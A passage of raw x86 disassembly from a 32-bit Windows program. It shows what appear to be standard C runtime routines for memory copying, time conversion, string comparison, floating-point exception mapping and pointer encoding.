  4055bc:	8a 46 03             	mov    0x3(%esi),%al
  4055bf:	88 47 03             	mov    %al,0x3(%edi)
  4055c2:	8a 46 02             	mov    0x2(%esi),%al
  4055c5:	88 47 02             	mov    %al,0x2(%edi)
  4055c8:	8a 46 01             	mov    0x1(%esi),%al
  4055cb:	88 47 01             	mov    %al,0x1(%edi)
  4055ce:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4055d2:	5e                   	pop    %esi
  4055d3:	5f                   	pop    %edi
  4055d4:	c3                   	ret
  4055d5:	f7 c7 0f 00 00 00    	test   $0xf,%edi
  4055db:	74 0f                	je     0x4055ec
  4055dd:	49                   	dec    %ecx
  4055de:	4e                   	dec    %esi
  4055df:	4f                   	dec    %edi
  4055e0:	8a 06                	mov    (%esi),%al
  4055e2:	88 07                	mov    %al,(%edi)
  4055e4:	f7 c7 0f 00 00 00    	test   $0xf,%edi
  4055ea:	75 f1                	jne    0x4055dd
  4055ec:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  4055f2:	72 68                	jb     0x40565c
  4055f4:	81 ee 80 00 00 00    	sub    $0x80,%esi
  4055fa:	81 ef 80 00 00 00    	sub    $0x80,%edi
  405600:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  405604:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  405609:	f3 0f 6f 56 20       	movdqu 0x20(%esi),%xmm2
  40560e:	f3 0f 6f 5e 30       	movdqu 0x30(%esi),%xmm3
  405613:	f3 0f 6f 66 40       	movdqu 0x40(%esi),%xmm4
  405618:	f3 0f 6f 6e 50       	movdqu 0x50(%esi),%xmm5
  40561d:	f3 0f 6f 76 60       	movdqu 0x60(%esi),%xmm6
  405622:	f3 0f 6f 7e 70       	movdqu 0x70(%esi),%xmm7
  405627:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  40562b:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  405630:	f3 0f 7f 57 20       	movdqu %xmm2,0x20(%edi)
  405635:	f3 0f 7f 5f 30       	movdqu %xmm3,0x30(%edi)
  40563a:	f3 0f 7f 67 40       	movdqu %xmm4,0x40(%edi)
  40563f:	f3 0f 7f 6f 50       	movdqu %xmm5,0x50(%edi)
  405644:	f3 0f 7f 77 60       	movdqu %xmm6,0x60(%edi)
  405649:	f3 0f 7f 7f 70       	movdqu %xmm7,0x70(%edi)
  40564e:	81 e9 80 00 00 00    	sub    $0x80,%ecx
  405654:	f7 c1 80 ff ff ff    	test   $0xffffff80,%ecx
  40565a:	75 90                	jne    0x4055ec
  40565c:	83 f9 20             	cmp    $0x20,%ecx
  40565f:	72 23                	jb     0x405684
  405661:	83 ee 20             	sub    $0x20,%esi
  405664:	83 ef 20             	sub    $0x20,%edi
  405667:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  40566b:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  405670:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  405674:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  405679:	83 e9 20             	sub    $0x20,%ecx
  40567c:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  405682:	75 dd                	jne    0x405661
  405684:	f7 c1 fc ff ff ff    	test   $0xfffffffc,%ecx
  40568a:	74 15                	je     0x4056a1
  40568c:	83 ef 04             	sub    $0x4,%edi
  40568f:	83 ee 04             	sub    $0x4,%esi
  405692:	8b 06                	mov    (%esi),%eax
  405694:	89 07                	mov    %eax,(%edi)
  405696:	83 e9 04             	sub    $0x4,%ecx
  405699:	f7 c1 fc ff ff ff    	test   $0xfffffffc,%ecx
  40569f:	75 eb                	jne    0x40568c
  4056a1:	85 c9                	test   %ecx,%ecx
  4056a3:	74 0f                	je     0x4056b4
  4056a5:	83 ef 01             	sub    $0x1,%edi
  4056a8:	83 ee 01             	sub    $0x1,%esi
  4056ab:	8a 06                	mov    (%esi),%al
  4056ad:	88 07                	mov    %al,(%edi)
  4056af:	83 e9 01             	sub    $0x1,%ecx
  4056b2:	75 f1                	jne    0x4056a5
  4056b4:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4056b8:	5e                   	pop    %esi
  4056b9:	5f                   	pop    %edi
  4056ba:	c3                   	ret
  4056bb:	eb 03                	jmp    0x4056c0
  4056bd:	cc                   	int3
  4056be:	cc                   	int3
  4056bf:	cc                   	int3
  4056c0:	8b c6                	mov    %esi,%eax
  4056c2:	83 e0 0f             	and    $0xf,%eax
  4056c5:	85 c0                	test   %eax,%eax
  4056c7:	0f 85 e3 00 00 00    	jne    0x4057b0
  4056cd:	8b d1                	mov    %ecx,%edx
  4056cf:	83 e1 7f             	and    $0x7f,%ecx
  4056d2:	c1 ea 07             	shr    $0x7,%edx
  4056d5:	74 66                	je     0x40573d
  4056d7:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4056de:	8b ff                	mov    %edi,%edi
  4056e0:	66 0f 6f 06          	movdqa (%esi),%xmm0
  4056e4:	66 0f 6f 4e 10       	movdqa 0x10(%esi),%xmm1
  4056e9:	66 0f 6f 56 20       	movdqa 0x20(%esi),%xmm2
  4056ee:	66 0f 6f 5e 30       	movdqa 0x30(%esi),%xmm3
  4056f3:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  4056f7:	66 0f 7f 4f 10       	movdqa %xmm1,0x10(%edi)
  4056fc:	66 0f 7f 57 20       	movdqa %xmm2,0x20(%edi)
  405701:	66 0f 7f 5f 30       	movdqa %xmm3,0x30(%edi)
  405706:	66 0f 6f 66 40       	movdqa 0x40(%esi),%xmm4
  40570b:	66 0f 6f 6e 50       	movdqa 0x50(%esi),%xmm5
  405710:	66 0f 6f 76 60       	movdqa 0x60(%esi),%xmm6
  405715:	66 0f 6f 7e 70       	movdqa 0x70(%esi),%xmm7
  40571a:	66 0f 7f 67 40       	movdqa %xmm4,0x40(%edi)
  40571f:	66 0f 7f 6f 50       	movdqa %xmm5,0x50(%edi)
  405724:	66 0f 7f 77 60       	movdqa %xmm6,0x60(%edi)
  405729:	66 0f 7f 7f 70       	movdqa %xmm7,0x70(%edi)
  40572e:	8d b6 80 00 00 00    	lea    0x80(%esi),%esi
  405734:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  40573a:	4a                   	dec    %edx
  40573b:	75 a3                	jne    0x4056e0
  40573d:	85 c9                	test   %ecx,%ecx
  40573f:	74 5f                	je     0x4057a0
  405741:	8b d1                	mov    %ecx,%edx
  405743:	c1 ea 05             	shr    $0x5,%edx
  405746:	85 d2                	test   %edx,%edx
  405748:	74 21                	je     0x40576b
  40574a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  405750:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  405754:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  405759:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  40575d:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  405762:	8d 76 20             	lea    0x20(%esi),%esi
  405765:	8d 7f 20             	lea    0x20(%edi),%edi
  405768:	4a                   	dec    %edx
  405769:	75 e5                	jne    0x405750
  40576b:	83 e1 1f             	and    $0x1f,%ecx
  40576e:	74 30                	je     0x4057a0
  405770:	8b c1                	mov    %ecx,%eax
  405772:	c1 e9 02             	shr    $0x2,%ecx
  405775:	74 0f                	je     0x405786
  405777:	8b 16                	mov    (%esi),%edx
  405779:	89 17                	mov    %edx,(%edi)
  40577b:	83 c7 04             	add    $0x4,%edi
  40577e:	83 c6 04             	add    $0x4,%esi
  405781:	83 e9 01             	sub    $0x1,%ecx
  405784:	75 f1                	jne    0x405777
  405786:	8b c8                	mov    %eax,%ecx
  405788:	83 e1 03             	and    $0x3,%ecx
  40578b:	74 13                	je     0x4057a0
  40578d:	8a 06                	mov    (%esi),%al
  40578f:	88 07                	mov    %al,(%edi)
  405791:	46                   	inc    %esi
  405792:	47                   	inc    %edi
  405793:	49                   	dec    %ecx
  405794:	75 f7                	jne    0x40578d
  405796:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40579d:	8d 49 00             	lea    0x0(%ecx),%ecx
  4057a0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4057a4:	5e                   	pop    %esi
  4057a5:	5f                   	pop    %edi
  4057a6:	c3                   	ret
  4057a7:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4057ae:	8b ff                	mov    %edi,%edi
  4057b0:	ba 10 00 00 00       	mov    $0x10,%edx
  4057b5:	2b d0                	sub    %eax,%edx
  4057b7:	2b ca                	sub    %edx,%ecx
  4057b9:	51                   	push   %ecx
  4057ba:	8b c2                	mov    %edx,%eax
  4057bc:	8b c8                	mov    %eax,%ecx
  4057be:	83 e1 03             	and    $0x3,%ecx
  4057c1:	74 09                	je     0x4057cc
  4057c3:	8a 16                	mov    (%esi),%dl
  4057c5:	88 17                	mov    %dl,(%edi)
  4057c7:	46                   	inc    %esi
  4057c8:	47                   	inc    %edi
  4057c9:	49                   	dec    %ecx
  4057ca:	75 f7                	jne    0x4057c3
  4057cc:	c1 e8 02             	shr    $0x2,%eax
  4057cf:	74 0d                	je     0x4057de
  4057d1:	8b 16                	mov    (%esi),%edx
  4057d3:	89 17                	mov    %edx,(%edi)
  4057d5:	8d 76 04             	lea    0x4(%esi),%esi
  4057d8:	8d 7f 04             	lea    0x4(%edi),%edi
  4057db:	48                   	dec    %eax
  4057dc:	75 f3                	jne    0x4057d1
  4057de:	59                   	pop    %ecx
  4057df:	e9 e9 fe ff ff       	jmp    0x4056cd
  4057e4:	cc                   	int3
  4057e5:	cc                   	int3
  4057e6:	cc                   	int3
  4057e7:	cc                   	int3
  4057e8:	cc                   	int3
  4057e9:	cc                   	int3
  4057ea:	cc                   	int3
  4057eb:	cc                   	int3
  4057ec:	cc                   	int3
  4057ed:	cc                   	int3
  4057ee:	cc                   	int3
  4057ef:	cc                   	int3
  4057f0:	8b ff                	mov    %edi,%edi
  4057f2:	55                   	push   %ebp
  4057f3:	8b ec                	mov    %esp,%ebp
  4057f5:	e8 06 18 00 00       	call   0x407000
  4057fa:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4057fd:	89 48 18             	mov    %ecx,0x18(%eax)
  405800:	5d                   	pop    %ebp
  405801:	c3                   	ret
  405802:	8b ff                	mov    %edi,%edi
  405804:	55                   	push   %ebp
  405805:	8b ec                	mov    %esp,%ebp
  405807:	51                   	push   %ecx
  405808:	51                   	push   %ecx
  405809:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40580d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405810:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405814:	50                   	push   %eax
  405815:	ff 15 64 f1 40 00    	call   *0x40f164
  40581b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40581e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405821:	2d 00 80 3e d5       	sub    $0xd53e8000,%eax
  405826:	81 d9 de b1 9d 01    	sbb    $0x19db1de,%ecx
  40582c:	81 f9 78 f0 83 04    	cmp    $0x483f078,%ecx
  405832:	7f 19                	jg     0x40584d
  405834:	7c 07                	jl     0x40583d
  405836:	3d 00 80 47 dd       	cmp    $0xdd478000,%eax
  40583b:	73 10                	jae    0x40584d
  40583d:	6a 00                	push   $0x0
  40583f:	68 80 96 98 00       	push   $0x989680
  405844:	51                   	push   %ecx
  405845:	50                   	push   %eax
  405846:	e8 75 8b 00 00       	call   0x40e3c0
  40584b:	eb 05                	jmp    0x405852
  40584d:	83 c8 ff             	or     $0xffffffff,%eax
  405850:	8b d0                	mov    %eax,%edx
  405852:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405855:	85 c9                	test   %ecx,%ecx
  405857:	74 05                	je     0x40585e
  405859:	89 01                	mov    %eax,(%ecx)
  40585b:	89 51 04             	mov    %edx,0x4(%ecx)
  40585e:	c9                   	leave
  40585f:	c3                   	ret
  405860:	8b ff                	mov    %edi,%edi
  405862:	55                   	push   %ebp
  405863:	8b ec                	mov    %esp,%ebp
  405865:	53                   	push   %ebx
  405866:	57                   	push   %edi
  405867:	8b f9                	mov    %ecx,%edi
  405869:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40586c:	c6 47 0c 00          	movb   $0x0,0xc(%edi)
  405870:	8d 5f 04             	lea    0x4(%edi),%ebx
  405873:	85 c9                	test   %ecx,%ecx
  405875:	74 09                	je     0x405880
  405877:	8b 01                	mov    (%ecx),%eax
  405879:	89 03                	mov    %eax,(%ebx)
  40587b:	8b 41 04             	mov    0x4(%ecx),%eax
  40587e:	eb 15                	jmp    0x405895
  405880:	83 3d 38 6e 41 00 00 	cmpl   $0x0,0x416e38
  405887:	75 11                	jne    0x40589a
  405889:	a1 18 61 41 00       	mov    0x416118,%eax
  40588e:	89 03                	mov    %eax,(%ebx)
  405890:	a1 1c 61 41 00       	mov    0x41611c,%eax
  405895:	89 43 04             	mov    %eax,0x4(%ebx)
  405898:	eb 41                	jmp    0x4058db
  40589a:	56                   	push   %esi
  40589b:	e8 60 17 00 00       	call   0x407000
  4058a0:	89 07                	mov    %eax,(%edi)
  4058a2:	8d 77 08             	lea    0x8(%edi),%esi
  4058a5:	53                   	push   %ebx
  4058a6:	50                   	push   %eax
  4058a7:	8b 48 4c             	mov    0x4c(%eax),%ecx
  4058aa:	89 0b                	mov    %ecx,(%ebx)
  4058ac:	8b 48 48             	mov    0x48(%eax),%ecx
  4058af:	89 0e                	mov    %ecx,(%esi)
  4058b1:	e8 48 20 00 00       	call   0x4078fe
  4058b6:	56                   	push   %esi
  4058b7:	ff 37                	push   (%edi)
  4058b9:	e8 6d 20 00 00       	call   0x40792b
  4058be:	8b 0f                	mov    (%edi),%ecx
  4058c0:	83 c4 10             	add    $0x10,%esp
  4058c3:	8b 81 50 03 00 00    	mov    0x350(%ecx),%eax
  4058c9:	5e                   	pop    %esi
  4058ca:	a8 02                	test   $0x2,%al
  4058cc:	75 0d                	jne    0x4058db
  4058ce:	83 c8 02             	or     $0x2,%eax
  4058d1:	89 81 50 03 00 00    	mov    %eax,0x350(%ecx)
  4058d7:	c6 47 0c 01          	movb   $0x1,0xc(%edi)
  4058db:	8b c7                	mov    %edi,%eax
  4058dd:	5f                   	pop    %edi
  4058de:	5b                   	pop    %ebx
  4058df:	5d                   	pop    %ebp
  4058e0:	c2 04 00             	ret    $0x4
  4058e3:	8b ff                	mov    %edi,%edi
  4058e5:	55                   	push   %ebp
  4058e6:	8b ec                	mov    %esp,%ebp
  4058e8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4058eb:	85 c9                	test   %ecx,%ecx
  4058ed:	75 04                	jne    0x4058f3
  4058ef:	33 c0                	xor    %eax,%eax
  4058f1:	5d                   	pop    %ebp
  4058f2:	c3                   	ret
  4058f3:	53                   	push   %ebx
  4058f4:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4058f7:	56                   	push   %esi
  4058f8:	57                   	push   %edi
  4058f9:	8b 7d 08             	mov    0x8(%ebp),%edi
  4058fc:	0f b7 17             	movzwl (%edi),%edx
  4058ff:	8d 42 bf             	lea    -0x41(%edx),%eax
  405902:	83 f8 19             	cmp    $0x19,%eax
  405905:	77 03                	ja     0x40590a
  405907:	83 c2 20             	add    $0x20,%edx
  40590a:	0f b7 33             	movzwl (%ebx),%esi
  40590d:	83 c7 02             	add    $0x2,%edi
  405910:	8d 46 bf             	lea    -0x41(%esi),%eax
  405913:	83 f8 19             	cmp    $0x19,%eax
  405916:	77 03                	ja     0x40591b
  405918:	83 c6 20             	add    $0x20,%esi
  40591b:	8b c2                	mov    %edx,%eax
  40591d:	83 c3 02             	add    $0x2,%ebx
  405920:	2b c6                	sub    %esi,%eax
  405922:	75 09                	jne    0x40592d
  405924:	85 d2                	test   %edx,%edx
  405926:	74 05                	je     0x40592d
  405928:	83 e9 01             	sub    $0x1,%ecx
  40592b:	75 cf                	jne    0x4058fc
  40592d:	5f                   	pop    %edi
  40592e:	5e                   	pop    %esi
  40592f:	5b                   	pop    %ebx
  405930:	5d                   	pop    %ebp
  405931:	c3                   	ret
  405932:	8b ff                	mov    %edi,%edi
  405934:	55                   	push   %ebp
  405935:	8b ec                	mov    %esp,%ebp
  405937:	8b 45 08             	mov    0x8(%ebp),%eax
  40593a:	a3 04 6d 41 00       	mov    %eax,0x416d04
  40593f:	5d                   	pop    %ebp
  405940:	c3                   	ret
  405941:	8b ff                	mov    %edi,%edi
  405943:	55                   	push   %ebp
  405944:	8b ec                	mov    %esp,%ebp
  405946:	56                   	push   %esi
  405947:	e8 22 00 00 00       	call   0x40596e
  40594c:	8b f0                	mov    %eax,%esi
  40594e:	85 f6                	test   %esi,%esi
  405950:	74 17                	je     0x405969
  405952:	ff 75 08             	push   0x8(%ebp)
  405955:	8b ce                	mov    %esi,%ecx
  405957:	ff 15 24 f2 40 00    	call   *0x40f224
  40595d:	ff d6                	call   *%esi
  40595f:	59                   	pop    %ecx
  405960:	85 c0                	test   %eax,%eax
  405962:	74 05                	je     0x405969
  405964:	33 c0                	xor    %eax,%eax
  405966:	40                   	inc    %eax
  405967:	eb 02                	jmp    0x40596b
  405969:	33 c0                	xor    %eax,%eax
  40596b:	5e                   	pop    %esi
  40596c:	5d                   	pop    %ebp
  40596d:	c3                   	ret
  40596e:	6a 0c                	push   $0xc
  405970:	68 b8 48 41 00       	push   $0x4148b8
  405975:	e8 76 e8 ff ff       	call   0x4041f0
  40597a:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  40597e:	6a 00                	push   $0x0
  405980:	e8 38 20 00 00       	call   0x4079bd
  405985:	59                   	pop    %ecx
  405986:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40598a:	8b 35 04 60 41 00    	mov    0x416004,%esi
  405990:	8b ce                	mov    %esi,%ecx
  405992:	83 e1 1f             	and    $0x1f,%ecx
  405995:	33 35 04 6d 41 00    	xor    0x416d04,%esi
  40599b:	d3 ce                	ror    %cl,%esi
  40599d:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4059a0:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4059a7:	e8 15 00 00 00       	call   0x4059c1
  4059ac:	8b c6                	mov    %esi,%eax
  4059ae:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4059b1:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4059b8:	59                   	pop    %ecx
  4059b9:	5f                   	pop    %edi
  4059ba:	5e                   	pop    %esi
  4059bb:	5b                   	pop    %ebx
  4059bc:	c9                   	leave
  4059bd:	c3                   	ret
  4059be:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4059c1:	6a 00                	push   $0x0
  4059c3:	e8 3d 20 00 00       	call   0x407a05
  4059c8:	59                   	pop    %ecx
  4059c9:	c3                   	ret
  4059ca:	8b ff                	mov    %edi,%edi
  4059cc:	55                   	push   %ebp
  4059cd:	8b ec                	mov    %esp,%ebp
  4059cf:	5d                   	pop    %ebp
  4059d0:	e9 47 20 00 00       	jmp    0x407a1c
  4059d5:	8b ff                	mov    %edi,%edi
  4059d7:	55                   	push   %ebp
  4059d8:	8b ec                	mov    %esp,%ebp
  4059da:	51                   	push   %ecx
  4059db:	53                   	push   %ebx
  4059dc:	56                   	push   %esi
  4059dd:	57                   	push   %edi
  4059de:	e8 74 17 00 00       	call   0x407157
  4059e3:	8b f0                	mov    %eax,%esi
  4059e5:	85 f6                	test   %esi,%esi
  4059e7:	0f 84 39 01 00 00    	je     0x405b26
  4059ed:	8b 16                	mov    (%esi),%edx
  4059ef:	33 db                	xor    %ebx,%ebx
  4059f1:	8b ca                	mov    %edx,%ecx
  4059f3:	8d 82 90 00 00 00    	lea    0x90(%edx),%eax
  4059f9:	3b d0                	cmp    %eax,%edx
  4059fb:	74 0e                	je     0x405a0b
  4059fd:	8b 7d 08             	mov    0x8(%ebp),%edi
  405a00:	39 39                	cmp    %edi,(%ecx)
  405a02:	74 09                	je     0x405a0d
  405a04:	83 c1 0c             	add    $0xc,%ecx
  405a07:	3b c8                	cmp    %eax,%ecx
  405a09:	75 f5                	jne    0x405a00
  405a0b:	8b cb                	mov    %ebx,%ecx
  405a0d:	85 c9                	test   %ecx,%ecx
  405a0f:	0f 84 11 01 00 00    	je     0x405b26
  405a15:	8b 79 08             	mov    0x8(%ecx),%edi
  405a18:	85 ff                	test   %edi,%edi
  405a1a:	0f 84 06 01 00 00    	je     0x405b26
  405a20:	83 ff 05             	cmp    $0x5,%edi
  405a23:	75 0b                	jne    0x405a30
  405a25:	33 c0                	xor    %eax,%eax
  405a27:	89 59 08             	mov    %ebx,0x8(%ecx)
  405a2a:	40                   	inc    %eax
  405a2b:	e9 f8 00 00 00       	jmp    0x405b28
  405a30:	83 ff 01             	cmp    $0x1,%edi
  405a33:	75 08                	jne    0x405a3d
  405a35:	83 c8 ff             	or     $0xffffffff,%eax
  405a38:	e9 eb 00 00 00       	jmp    0x405b28
  405a3d:	8b 46 04             	mov    0x4(%esi),%eax
  405a40:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405a43:	8b 45 0c             	mov    0xc(%ebp),%eax
  405a46:	89 46 04             	mov    %eax,0x4(%esi)
  405a49:	83 79 04 08          	cmpl   $0x8,0x4(%ecx)
  405a4d:	0f 85 b7 00 00 00    	jne    0x405b0a
  405a53:	8d 42 24             	lea    0x24(%edx),%eax
  405a56:	8d 50 6c             	lea    0x6c(%eax),%edx
  405a59:	eb 06                	jmp    0x405a61
  405a5b:	89 58 08             	mov    %ebx,0x8(%eax)
  405a5e:	83 c0 0c             	add    $0xc,%eax
  405a61:	3b c2                	cmp    %edx,%eax
  405a63:	75 f6                	jne    0x405a5b
  405a65:	8b 5e 08             	mov    0x8(%esi),%ebx
  405a68:	b8 91 00 00 c0       	mov    $0xc0000091,%eax
  405a6d:	39 01                	cmp    %eax,(%ecx)
  405a6f:	77 47                	ja     0x405ab8
  405a71:	74 3e                	je     0x405ab1
  405a73:	81 39 8d 00 00 c0    	cmpl   $0xc000008d,(%ecx)
  405a79:	74 2f                	je     0x405aaa
  405a7b:	81 39 8e 00 00 c0    	cmpl   $0xc000008e,(%ecx)
  405a81:	74 20                	je     0x405aa3
  405a83:	81 39 8f 00 00 c0    	cmpl   $0xc000008f,(%ecx)
  405a89:	74 11                	je     0x405a9c
  405a8b:	81 39 90 00 00 c0    	cmpl   $0xc0000090,(%ecx)
  405a91:	8b c3                	mov    %ebx,%eax
  405a93:	75 62                	jne    0x405af7
  405a95:	b8 81 00 00 00       	mov    $0x81,%eax
  405a9a:	eb 58                	jmp    0x405af4
  405a9c:	b8 86 00 00 00       	mov    $0x86,%eax
  405aa1:	eb 51                	jmp    0x405af4
  405aa3:	b8 83 00 00 00       	mov    $0x83,%eax
  405aa8:	eb 4a                	jmp    0x405af4
  405aaa:	b8 82 00 00 00       	mov    $0x82,%eax
  405aaf:	eb 43                	jmp    0x405af4
  405ab1:	b8 84 00 00 00       	mov    $0x84,%eax
  405ab6:	eb 3c                	jmp    0x405af4
  405ab8:	81 39 92 00 00 c0    	cmpl   $0xc0000092,(%ecx)
  405abe:	74 2f                	je     0x405aef
  405ac0:	81 39 93 00 00 c0    	cmpl   $0xc0000093,(%ecx)
  405ac6:	74 20                	je     0x405ae8
  405ac8:	81 39 b4 02 00 c0    	cmpl   $0xc00002b4,(%ecx)
  405ace:	74 11                	je     0x405ae1
  405ad0:	81 39 b5 02 00 c0    	cmpl   $0xc00002b5,(%ecx)
  405ad6:	8b c3                	mov    %ebx,%eax
  405ad8:	75 1d                	jne    0x405af7
  405ada:	b8 8d 00 00 00       	mov    $0x8d,%eax
  405adf:	eb 13                	jmp    0x405af4
  405ae1:	b8 8e 00 00 00       	mov    $0x8e,%eax
  405ae6:	eb 0c                	jmp    0x405af4
  405ae8:	b8 85 00 00 00       	mov    $0x85,%eax
  405aed:	eb 05                	jmp    0x405af4
  405aef:	b8 8a 00 00 00       	mov    $0x8a,%eax
  405af4:	89 46 08             	mov    %eax,0x8(%esi)
  405af7:	50                   	push   %eax
  405af8:	6a 08                	push   $0x8
  405afa:	8b cf                	mov    %edi,%ecx
  405afc:	ff 15 24 f2 40 00    	call   *0x40f224
  405b02:	ff d7                	call   *%edi
  405b04:	59                   	pop    %ecx
  405b05:	89 5e 08             	mov    %ebx,0x8(%esi)
  405b08:	eb 10                	jmp    0x405b1a
  405b0a:	ff 71 04             	push   0x4(%ecx)
  405b0d:	89 59 08             	mov    %ebx,0x8(%ecx)
  405b10:	8b cf                	mov    %edi,%ecx
  405b12:	ff 15 24 f2 40 00    	call   *0x40f224
  405b18:	ff d7                	call   *%edi
  405b1a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405b1d:	59                   	pop    %ecx
  405b1e:	89 46 04             	mov    %eax,0x4(%esi)
  405b21:	e9 0f ff ff ff       	jmp    0x405a35
  405b26:	33 c0                	xor    %eax,%eax
  405b28:	5f                   	pop    %edi
  405b29:	5e                   	pop    %esi
  405b2a:	5b                   	pop    %ebx
  405b2b:	c9                   	leave
  405b2c:	c3                   	ret
  405b2d:	a1 08 6d 41 00       	mov    0x416d08,%eax
  405b32:	c3                   	ret
  405b33:	8b ff                	mov    %edi,%edi
  405b35:	55                   	push   %ebp
  405b36:	8b ec                	mov    %esp,%ebp
  405b38:	8b 45 08             	mov    0x8(%ebp),%eax
  405b3b:	a3 08 6d 41 00       	mov    %eax,0x416d08
  405b40:	5d                   	pop    %ebp
  405b41:	c3                   	ret
  405b42:	8b ff                	mov    %edi,%edi
  405b44:	55                   	push   %ebp
  405b45:	8b ec                	mov    %esp,%ebp
  405b47:	a1 04 60 41 00       	mov    0x416004,%eax
  405b4c:	83 e0 1f             	and    $0x1f,%eax
  405b4f:	6a 20                	push   $0x20
  405b51:	59                   	pop    %ecx
  405b52:	2b c8                	sub    %eax,%ecx
  405b54:	8b 45 08             	mov    0x8(%ebp),%eax
  405b57:	d3 c8                	ror    %cl,%eax
  405b59:	33 05 04 60 41 00    	xor    0x416004,%eax
  405b5f:	5d                   	pop    %ebp
  405b60:	c3                   	ret
  405b61:	a1 04 60 41 00       	mov    0x416004,%eax
  405b66:	8b c8                	mov    %eax,%ecx
  405b68:	33 05 0c 6d 41 00    	xor    0x416d0c,%eax
  405b6e:	83 e1 1f             	and    $0x1f,%ecx
  405b71:	d3 c8                	ror    %cl,%eax
  405b73:	85 c0                	test   %eax,%eax
  405b75:	0f 95 c0             	setne  %al
  405b78:	c3                   	ret
  405b79:	8b ff                	mov    %edi,%edi
  405b7b:	55                   	push   %ebp
  405b7c:	8b ec                	mov    %esp,%ebp
  405b7e:	8b 45 08             	mov    0x8(%ebp),%eax
  405b81:	a3 0c 6d 41 00       	mov    %eax,0x416d0c
  405b86:	5d                   	pop    %ebp
  405b87:	c3                   	ret
  405b88:	8b ff                	mov    %edi,%edi
  405b8a:	55                   	push   %ebp
  405b8b:	8b ec                	mov    %esp,%ebp
  405b8d:	56                   	push   %esi
  405b8e:	8b 35 04 60 41 00    	mov    0x416004,%esi
  405b94:	8b ce                	mov    %esi,%ecx
  405b96:	33 35 0c 6d 41 00    	xor    0x416d0c,%esi
  405b9c:	83 e1 1f             	and    $0x1f,%ecx
  405b9f:	d3 ce                	ror    %cl,%esi
  405ba1:	85 f6                	test   %esi,%esi
  405ba3:	75 04                	jne    0x405ba9
  405ba5:	33 c0                	xor    %eax,%eax
  405ba7:	eb 0e                	jmp    0x405bb7
  405ba9:	ff 75 08             	push   0x8(%ebp)
  405bac:	8b ce                	mov    %esi,%ecx
  405bae:	ff 15 24 f2 40 00    	call   *0x40f224
  405bb4:	ff d6                	call   *%esi
  405bb6:	59                   	pop    %ecx
  405bb7:	5e                   	pop    %esi
  405bb8:	5d                   	pop    %ebp
  405bb9:	c3                   	ret
  405bba:	8b ff                	mov    %edi,%edi
  405bbc:	55                   	push   %ebp
  405bbd:	8b ec                	mov    %esp,%ebp
  405bbf:	ff 75 08             	push   0x8(%ebp)
  405bc2:	e8 7b ff ff ff       	call   0x405b42
  405bc7:	59                   	pop    %ecx
  405bc8:	a3 0c 6d 41 00       	mov    %eax,0x416d0c
  405bcd:	5d                   	pop    %ebp
  405bce:	c3                   	ret
  405bcf:	8b ff                	mov    %edi,%edi
  405bd1:	55                   	push   %ebp
  405bd2:	8b ec                	mov    %esp,%ebp
  405bd4:	83 ec 10             	sub    $0x10,%esp
  405bd7:	53                   	push   %ebx
  405bd8:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405bdb:	85 db                	test   %ebx,%ebx
  405bdd:	75 07                	jne    0x405be6
  405bdf:	33 c0                	xor    %eax,%eax
  405be1:	e9 1c 01 00 00       	jmp    0x405d02
  405be6:	56                   	push   %esi
  405be7:	83 fb 02             	cmp    $0x2,%ebx
  405bea:	74 1b                	je     0x405c07
  405bec:	83 fb 01             	cmp    $0x1,%ebx
  405bef:	74 16                	je     0x405c07
  405bf1:	e8 c5 18 00 00       	call   0x4074bb
  405bf6:	6a 16                	push   $0x16
  405bf8:	5e                   	pop    %esi
  405bf9:	89 30                	mov    %esi,(%eax)
  405bfb:	e8 fe 17 00 00       	call   0x4073fe
  405c00:	8b c6                	mov    %esi,%eax
  405c02:	e9 fa 00 00 00       	jmp    0x405d01
  405c07:	57                   	push   %edi
  405c08:	e8 e1 2d 00 00       	call   0x4089ee
  405c0d:	68 04 01 00 00       	push   $0x104
  405c12:	be 10 6d 41 00       	mov    $0x416d10,%esi
  405c17:	33 ff                	xor    %edi,%edi
  405c19:	56                   	push   %esi
  405c1a:	57                   	push   %edi
  405c1b:	e8 15 28 00 00       	call   0x408435
  405c20:	a1 b8 70 41 00       	mov    0x4170b8,%eax
